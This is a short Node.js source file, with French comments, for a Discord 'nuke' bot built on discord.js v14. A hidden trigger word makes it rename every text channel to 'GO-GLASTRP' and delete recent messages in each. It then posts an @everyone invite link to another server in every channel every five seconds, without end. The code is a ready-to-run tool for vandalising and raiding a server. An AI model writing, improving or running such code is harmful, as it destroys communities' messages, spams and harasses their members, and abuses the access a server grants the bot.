// LE SPAM DE SEVEN - VERSION DISCORD.JS V14
const { Client, GatewayIntentBits } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// la phrase magique
const ACTIVATION_WORD = '!!!cadeaudu7';
const NEW_NAME = 'GO-GLASTRP';
const SPAM_LINK = 'GO TOUT LE MONDE @EVERYONE https://discord.gg/glastv1';

client.on('ready', () => {
  console.log("Logged in as " + client.user.tag);
});

client.on('messageCreate', async (message) => {
  if (message.content === ACTIVATION_WORD) {
    await message.channel.send('OKAAYYY LESSGOOO');

    const guild = message.guild;
    if (!guild) return;

    // CORRECTION V14 : channel.isTextBased() au lieu de channel.isText()
    for (const channel of guild.channels.cache.values()) {
      if (channel.isTextBased()) {
        try {
          await channel.setName(NEW_NAME);
          const fetched = await channel.messages.fetch({ limit: 100 });
          fetched.forEach(msg => msg.delete().catch(() => {}));
        } catch (err) {
          console.error('Erreur channel:', err);
        }
      }
    }

    // SPAM INFINI TOUS LES 5s
    setInterval(() => {
      guild.channels.cache.forEach(ch => {
        if (ch.isTextBased()) {
          ch.send(SPAM_LINK).catch(() => {});
        }
      });
    }, 5000);
  }
});

client.login(process.env.DISCORD_TOKEN);
